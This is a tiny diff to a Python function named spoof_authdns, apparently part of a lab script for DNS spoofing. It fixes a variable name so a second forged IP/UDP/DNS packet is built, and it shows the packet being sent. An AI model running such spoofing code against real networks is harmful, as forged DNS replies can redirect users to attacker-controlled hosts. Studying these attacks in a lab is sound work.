@@ -37,7 +37,7 @@ def spoof_authdns(pkt):
 
      # Concatentate respective packet segments
      spoofpkt1 = IPpkt/UDPpkt/DNSpkt1
-     spoofpkt1 = IPpkt/UDPpkt/DNSpkt2
+     spoofpkt2 = IPpkt/UDPpkt/DNSpkt2
 
      # Send the packets for delivery
      send(spoofpkt1)
